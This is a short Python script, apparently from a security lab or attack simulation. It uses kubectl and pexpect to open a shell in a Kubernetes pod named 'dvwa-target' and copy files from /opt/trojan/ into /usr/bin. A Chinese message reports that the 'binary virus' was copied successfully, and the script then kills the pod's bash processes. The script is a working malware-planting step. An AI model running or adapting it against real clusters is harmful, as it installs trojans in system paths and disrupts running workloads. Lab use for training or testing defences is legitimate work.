import subprocess
import pexpect
import signal
import time

def copy_virus_process():
    get_pods_command = ["kubectl", "get", "pod", "-n", "xinfan"]
    process = subprocess.Popen(get_pods_command, stdout=subprocess.PIPE)
    output, error = process.communicate()

    if error:
        print(">>Error occurred:", error)
        return

    pod_name = None
    for line in output.decode().split('\n'):
        if "dvwa-target" in line:
            pod_name = line.split()[0]
            break

    if not pod_name:
        print(">>No pod found with 'dvwa-target' in its name")
        return

    # 使用获取到的pod名称执行kubectl exec命令获取交互式shell
    exec_command = "kubectl exec -it {} -n xinfan /bin/bash".format(pod_name)

    # 使用pexpect.spawn执行命令
    child = pexpect.spawn(exec_command)
    # 在交互式shell中执行命令
    command_to_copy_virus = "cp /opt/trojan/* /usr/bin/"
    child.sendline(command_to_copy_virus)
    print("\033[92m>>复制二进制病毒到/usr/bin路径成功\033[0m")
    command_to_kill_bash = "pkill -f /bin/bash"
    child.sendline(command_to_kill_bash)
    child.kill(signal.SIGINT)
    return
